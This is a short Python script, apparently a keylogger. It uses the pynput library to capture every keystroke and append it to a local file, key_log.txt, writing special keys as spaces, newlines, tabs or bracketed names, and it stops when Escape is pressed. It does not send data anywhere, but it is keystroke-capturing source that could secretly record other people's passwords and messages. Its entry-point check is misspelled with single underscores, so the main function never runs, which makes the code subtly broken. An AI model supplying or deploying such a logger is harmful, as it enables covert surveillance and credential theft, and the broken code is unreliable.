from pynput import keyboard

# File to store the logged keys
log_file = "key_log.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(key.char)
    except AttributeError:
        # Handle special keys (e.g., space, enter, etc.)
        with open(log_file, "a") as f:
            if key == keyboard.Key.space:
                f.write(" ")
            elif key == keyboard.Key.enter:
                f.write("\n")
            elif key == keyboard.Key.tab:
                f.write("\t")
            else:
                f.write(f"[{key.name}]")

def on_release(key):
    # Stop the listener when the escape key is pressed
    if key == keyboard.Key.esc:
        return False

def main():
    # Set up the key listener
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

if _name_ == "_main_":
    main()